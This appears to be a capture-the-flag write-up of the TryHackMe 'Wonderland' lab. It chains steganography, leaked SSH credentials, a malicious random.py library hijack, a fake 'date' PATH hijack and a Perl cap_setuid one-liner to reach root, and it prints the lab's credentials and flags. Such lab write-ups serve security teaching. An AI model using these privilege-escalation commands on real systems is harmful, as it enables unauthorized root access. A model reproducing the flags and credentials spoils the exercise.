---
title: "Wonderland - TryHackMe Writeup"
date: 2026-10-15
categories: [ctf]
tags: [tryhackme, linux, steganography, python-hijacking, path-hijacking, capabilities, privilege-escalation]
---

Hey! Let's walk through **Wonderland**, a Medium-difficulty Linux machine on TryHackMe themed around *Alice in Wonderland*. It chains together steganography, a Python library hijack, a PATH hijack inside a vulnerable binary, and a Linux capability abuse — four separate privilege transitions to get from anonymous web access all the way to root.

---

## Reconnaissance

I kicked things off with a standard Nmap scan against the target:

```bash
nmap -sVC -p- 10.129.140.68
```

![Nmap scan results](/home/assets/img/nmap-scan.png)

Two ports were open:
* **Port 22**: SSH (`OpenSSH 7.6p1`)
* **Port 80**: HTTP, running a Golang `net/http` server, with the page title "Follow the white rabbit."

That title was already a clue about the theme of the box.

---

## Discovering Hidden Directories & Steganography

Browsing to `http://10.129.140.68` landed me on a page themed around the White Rabbit:

![Follow the White Rabbit homepage](/home/assets/img/home-page.png)

Inspecting the page source revealed an image reference pointing to an `/img/` directory:

```html
<img src="/img/white_rabbit_1.jpg">
```

![Inspecting the page source](/home/assets/img/img_dir.png)

Browsing directly to `http://10.129.140.68/img/` gave me a full directory listing:

![Directory listing of /img/](/home/assets/img/img-dir.png)

Three files were sitting there: `alice_door.jpg`, `alice_door.png`, and `white_rabbit_1.jpg`. Given the Alice in Wonderland theme and the presence of both a `.jpg` and `.png` of the same image, steganography seemed likely. I tried `steghide` against all three:

```bash
steghide extract -sf alice_door.jpg
steghide extract -sf alice_door.png
steghide extract -sf white_rabbit_1.jpg
```

![Steghide extraction attempts](/home/assets/img/steghide-hint.png)

The first two failed (wrong passphrase / unsupported format), but `white_rabbit_1.jpg` worked with an empty passphrase and wrote out a `hint.txt` file:

```bash
cat hint.txt
```

![Reading the extracted hint](/home/assets/img/hint.png)

The hint read: **"follow the r a b b i t"** — a not-so-subtle pointer toward a hidden URL path.

---

## Finding Alice's Credentials

Following the hint literally, I browsed to:

http://10.129.140.68/r/a/b/b/i/t/


This revealed a page titled "Open the door and enter wonderland." Inspecting the page source again, I found a hidden `<p>` element (`style="display:none"`) containing a credential pair:

alice:HowDothTheLittleCrocodileImproveHisShiningTail


![Hidden credentials in the page source](/home/assets/img/alice-cred.png)

With a username and password in hand, I connected over SSH:

```bash
ssh alice@10.129.140.68
```

![SSH login as alice](/home/assets/img/ssh-alice.png)

`whoami` confirmed I was in as `alice`.

---

## Escalating via Python Library Hijacking (alice → rabbit)

Checking alice's sudo privileges was the obvious next step:

```bash
sudo -l
```

![sudo -l output for alice](/home/assets/img/sudo-l.png)

The result showed alice could run a specific Python script as the `rabbit` user, without a password:

(rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py


I checked what the script actually did:

```bash
cat walrus_and_the_carpenter.py
```

![Contents of walrus_and_the_carpenter.py](/home/assets/img/python-1.png)

The script started with a plain `import random` — and critically, Python looks in the current working directory *before* its standard library path when resolving imports. That meant if I could get a `random.py` of my own into the same directory, Python would load mine instead of the real `random` module.

I wrote a malicious `random.py` in alice's home directory:

```python
import os
os.system("/bin/bash")
```

![Malicious random.py](/home/assets/img/random.png)

Then ran the allowed sudo command:

```bash
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

Because the script's working directory was writable and contained my fake `random.py`, it loaded my module instead of the real one — spawning a shell as `rabbit` the moment it tried to `import random`.

![Shell as rabbit, listing teaParty binary](/home/assets/img/rabbit-user.png)

Inside `/home/rabbit`, there was a binary called `teaParty`.

---

## Abusing teaParty's PATH Hijack (rabbit → hatter)

To understand what `teaParty` actually did, I transferred it to my attacking machine for analysis. From the rabbit shell, I spun up a quick HTTP server:

```bash
python3 -m http.server
```

![Serving teaParty over HTTP](/home/assets/img/http_sever.png)

Then pulled it down with `wget` on my own machine:

```bash
wget http://10.129.146.128:8000/teaParty
```

![Downloading teaParty](/home/assets/img/recieve-teaparty.png)

Running `strings` against the binary revealed the program's internal logic:

```bash
strings teaParty
```

![Strings output revealing the date call](/home/assets/img/teaparty-data.png)

The binary printed "Welcome to the tea party!" and then shelled out to run `date` *without specifying an absolute path* — meaning it relied entirely on whatever `date` it found first in `$PATH`. That's a classic PATH hijack opportunity.

Back on the target as `rabbit`, I created a fake `date` executable, prepended the current directory to `$PATH`, and ran the binary:

```bash
echo "/bin/bash" > date
chmod +x date
export PATH=$(pwd):$PATH
./teaParty
```

Since my malicious `date` was now found first, `teaParty` executed it instead of the real `date` binary — dropping me into a shell as `hatter`. From there I found a `password.txt` sitting in hatter's home directory:

```bash
cd /home/hatter
cat password.txt
```

![Escalating from rabbit to hatter](/home/assets/img/esclating-from-rabbit-hatter.png)

The file contained: **`WhyIsARavenLikeAWritingDesk?`**

---

## Privilege Escalation via Perl Capabilities (hatter → root)

As `hatter`, I checked for binaries with special Linux capabilities:

```bash
getcap -r / 2>/dev/null
```

![getcap output showing perl capabilities](/home/assets/img/cap_setuid.png)

Both `/usr/bin/perl` and `/usr/bin/perl5.26.1` had the `cap_setuid+ep` capability — meaning either binary could change its effective user ID during execution. I used this to call `setuid(0)` directly from Perl:

```bash
cd /usr/bin
./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```

![Root shell via perl capability abuse](/home/assets/img/root.png)

`whoami` confirmed `root`. True to the box's theme, the flags weren't in their usual locations — the "root" flag was actually sitting in alice's home directory:

```bash
cat /home/alice/root.txt
```

thm{Twinkle, twinkle, little bat! How I wonder what you're at!}


And the "user" flag, in a final bit of Wonderland logic, was sitting in `/root/`:

```bash
cat /root/user.txt
```

![Reading the swapped user flag](/home/assets/img/user_flag.png)

thm{"Curiouser and curiouser!"}


---

## Summary

Wonderland doesn't rely on a single flashy exploit — it's a chain of four separate, smaller technique abuses: hidden data in an image, an insecure Python import pattern, a relative-path command execution inside a compiled binary, and an overprivileged capability on a scripting interpreter. Each step alone is a well-known class of vulnerability; the box's difficulty comes from recognizing which technique applies at each stage.
